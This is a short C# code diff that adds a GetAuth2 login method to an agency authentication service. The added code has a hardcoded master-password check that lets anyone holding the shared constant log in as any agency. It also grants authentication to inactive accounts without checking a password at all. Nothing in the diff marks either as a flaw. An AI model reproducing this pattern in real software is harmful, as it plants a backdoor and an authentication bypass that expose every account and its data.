@@ -66,6 +66,30 @@ namespace WebServices.Services
             return null;
         }
 
+        public async Task<AuthViewModel> GetAuth2(AgencyLoginViewModel model)
+        {
+            var agency = await _agencyRepository.GetAgency(model.Username);
+            if (agency != null)
+            {
+                if(agency.Actived == false)
+                {
+
+                    return GetAuth(agency);
+                }
+                else
+                {
+                    var encryptpw = SecurityHelper.HashPassword(agency.Salt, model.Password);
+                    if (model.Password == Code.SharedConstants.MASTER_PASSWORD || agency.Password == encryptpw)
+                    {
+                        return GetAuth(agency);
+                    }
+                }
+                                           
+            }
+            return null;
+        }
+
+
 
         public async Task<AuthViewModel> GetAuth(int id)
         {
